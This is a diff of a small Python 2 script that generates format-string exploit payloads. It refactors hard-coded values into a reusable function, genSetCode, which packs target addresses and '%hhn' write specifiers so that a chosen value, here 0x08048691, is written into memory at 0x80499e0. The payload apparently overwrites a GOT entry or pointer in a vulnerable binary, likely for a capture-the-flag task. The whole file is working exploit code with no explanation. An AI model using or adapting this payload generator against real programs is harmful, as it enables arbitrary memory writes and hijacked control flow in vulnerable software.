@@ -1,20 +1,14 @@
 import struct
 
-T = [
-        (0x80499e0, 0x91),
-        (0x80499e1, 0x86),
-        (0x80499e2, 0x04),
-        (0x80499e3, 0x08),
-]
-offset = 6
+def genSetCode(addr, val, offset):
+	code = ""
+	for i in xrange(4):
+		code += struct.pack("<I", addr + i)
+	n = len(code)
+	for i in xrange(4):
+		t = ((val >> (i * 8)) - n - 1) % 256 + 1
+		code += "%%%dc%%%d$hhn" % (t, offset + i)
+		n += t
+	return code
 
-code = "".join(struct.pack("<I",t[0]) for t in T)
-
-n = len(code)
-for i in range(len(T)):
-    t = (T[i][1]-n-1)%256+1
-    code += "%{0}c%{1}$hhn".format(t, offset+i)
-    n += t
-
-print code
-#print repr(code)
+print genSetCode(0x80499e0, 0x08048691, 6)
